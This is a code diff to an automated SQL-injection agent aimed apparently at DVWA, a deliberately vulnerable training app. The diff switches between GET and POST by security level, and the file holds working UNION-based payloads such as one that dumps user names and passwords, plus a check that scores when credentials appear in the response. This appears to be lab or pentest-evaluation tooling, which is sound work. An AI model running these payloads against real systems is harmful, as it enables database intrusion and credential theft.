@@ -25,8 +25,19 @@ _CONTENT_SIGNALS = ["admin", "password", "gordonb", "pablo", "smithy"]
 _SIGNALS = _STRUCTURAL_SIGNALS + _CONTENT_SIGNALS
 
 
+def _request(session: DVWASession, security_level: str, payload: str):
+    """Submit a SQLi form using the method exposed by the DVWA level."""
+    request_data = {"id": payload, "Submit": "Submit"}
+    if security_level == "medium":
+        return session.post(MODULE_PATH, data=request_data)
+    return session.get(MODULE_PATH, params=request_data)
+
+
 def _probe_preconditions(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "low",
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send probe payloads to detect if UNION SELECT is possible.
 
@@ -44,7 +55,7 @@ def _probe_preconditions(
         sent_any = True
         tried.append(payload)
         try:
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
             result = verifier.contains_any(resp.text, _SIGNALS)
             if resp.status_code == 200 and result.ok:
@@ -62,7 +73,10 @@ def _probe_preconditions(
 
 
 def _attempt_exploit(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "low",
 ) -> tuple[int, list[str], list[str], list[dict]]:
     """Try exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
     tried: list[str] = []
@@ -76,11 +90,14 @@ def _attempt_exploit(
             continue
         tried.append(payload)
         try:
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
             if resp.status_code == 200:
                 body = resp.text.lower()
                 # Full exploit: credentials appear in response
+                # Medium uses level-scoped UNION variants that cover the
+                # filtered column-count and LIMIT forms; the evidence gate
+                # remains identical for every security level.
                 if ("first name" in body or "surname" in body) and \
                    ("admin" in body or "gordonb" in body or "pablo" in body):
                     score = max(score, 3)
@@ -138,7 +155,7 @@ def sqli_union_agent(state: ExploitationState) -> dict[str, Any]:
         # Stage 1: PROBE
         probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["1' ORDER BY 1-- -", "1' UNION SELECT null-- -"]
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
-            session, probe_payloads, already_tried
+            session, probe_payloads, already_tried, security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
@@ -158,7 +175,7 @@ def sqli_union_agent(state: ExploitationState) -> dict[str, Any]:
         all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit") or ["1' UNION SELECT user,password FROM users-- -"]
 
         exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
-            session, all_exploit, already_tried | set(all_tried)
+            session, all_exploit, already_tried | set(all_tried), security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(exploit_events)
